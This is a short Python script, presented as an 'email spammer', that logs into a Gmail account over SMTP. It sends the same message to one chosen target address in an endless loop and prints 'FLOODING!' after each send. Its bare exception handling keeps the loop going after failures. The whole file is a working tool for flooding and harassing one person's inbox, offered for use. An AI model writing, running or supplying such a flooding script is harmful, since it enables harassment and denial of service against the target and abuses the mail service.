import smtplib

##############################
#EMAIL SPAMMER BY DATO VEKUA!#                
##############################

#BEFORE USING, PLEASE READ README.TXT FILE!!! ALL INSTRUCTIONS ARE GIVEN THERE!




email = "Your email" #This is Email, which is used for sending spam messages
pswrd = "Email password" #There should be password of Email
######
to = "Whos Email you want to spam"

def send_email(subject, msg):
	while 1==1:
		try:
			server = smtplib.SMTP('smtp.gmail.com:587')
			server.ehlo()
			server.starttls()
			server.login(email, pswrd)
			message = 'Subject: {}\n\n{}'.format(subject, msg)
			server.sendmail(email, to, message)
			server.quit()
			print('FLOODING!')
		except:
			print('FLOODING FAILED!')


subject = "Subject you want"
msg = "Message you want"

send_email(subject, msg)